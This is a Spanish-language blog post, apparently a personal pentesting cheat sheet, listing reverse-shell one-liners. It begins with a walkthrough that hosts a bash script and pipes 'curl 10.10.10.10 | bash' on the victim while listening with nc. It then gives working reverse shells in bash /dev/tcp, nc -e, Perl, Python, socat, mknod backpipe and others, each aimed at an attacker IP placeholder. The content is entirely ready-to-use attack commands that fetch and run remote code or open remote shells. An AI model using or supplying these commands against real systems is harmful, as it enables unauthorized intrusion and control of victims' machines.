---
title: Revershell cheet sheat
published: true
---

- Primeramente debes tener ejecucion remota de comandos, 
- luego verificar si hay curl  , lo haces con " which curl"
- luedo de la maquina atacante te abres un servidor http y creas un 
- index.html:

    	```
    	#!/bin/bash
    	bash -i >& /dev/tcp/10.10.10.10/443 0>&1
	```

- y te pones en escucha en la maquina atacante con:

	```
    	nc -nlvp 443 
    	```
- y ejecutas en la maquina victima lo siguiente 
 
	```
    	curl 10.10.10.10 | bash
	```
- obtendras una revershell(realizar tratamiento de la consola):

***********************
******MAS FORMAS*****
***********************

- Este comando usa netcat (nc) para establecer una conexión con el sistema atacante en la dirección IP especificada y 
- el puerto 443, y ejecuta una shell inversa para permitir al sistema atacante ejecutar comandos en el sistema objetivo.

    	```
    	nc -e /bin/sh X.X.X.X 443
    	```

- Este comando utiliza el intérprete de comandos "bash" y "redirecciones de descriptor de archivo" para establecer 
- una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.

	```
	bash -i >& /dev/tcp/X.X.X.X/443 0>&1 
	```

- Este comando utiliza el lenguaje de programación Perl y las funciones de socket para establecer una conexión
de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.
 
	```
    	perl -e 'use Socket;$i="X.X.X.X";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    	```
- Este comando utiliza el lenguaje de programación Python y las funciones de socket para establecer una conexión de
 "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.

    	```
    	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    	```
---

- Este comando utiliza el programa socat para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.
- El comando crea un pseudo-TTY y lo conecta a través de un socket TCP.

    	```
    	socat file:tty,raw,echo=0 tcp-connect:X.X.X.X:443 
    	```
- Este comando utiliza OpenSSH para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" a través del puerto 443. 
- El comando habilita un tunel inverso (reverse tunnel) en el puerto 443 del sistema objetivo, que se conecta al puerto 443 del sistema atacante.

    	```
    	ssh -R 443:localhost:443 user@X.X.X.X  
    	```
- Este comando utiliza el protocolo Telnet para establecer una conexión con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443, luego ejecuta un comando shell remotamente a través de esa conexión.

    	```
    	telnet X.X.X.X 443
    	```
- Este comando utiliza pipes ( tuberías) y la herramienta netcat para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.

    	```
    	mknod backpipe p && nc X.X.X.X 443 0<backpipe | /bin/bash 1>backpipe
    	```

- Este comando utiliza el intérprete de comandos "bash" y redirecciones de descriptor de archivo para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.

    	```
    	/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
    	```

- Este comando utiliza la herramienta openssl para establecer una conexión SSL/TLS con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443, luego ejecuta un comando shell remotamente a través de esa conexión.

    	```
    	openssl s_client -quiet -connect X.X.X.X:443
    	```

- Este comando utiliza redirecciones de descriptor de archivo y sockets TCP para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.

    	```
    	exec 5<>/dev/tcp/X.X.X.X/443
    	```

- Este comando utiliza xterm, una terminal gráfica para establecer una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" en el puerto TCP/IP predeterminado para XDMCP (X Display Manager Control Protocol).

    	```
    	xterm -display X.X.X.X:0
    	```
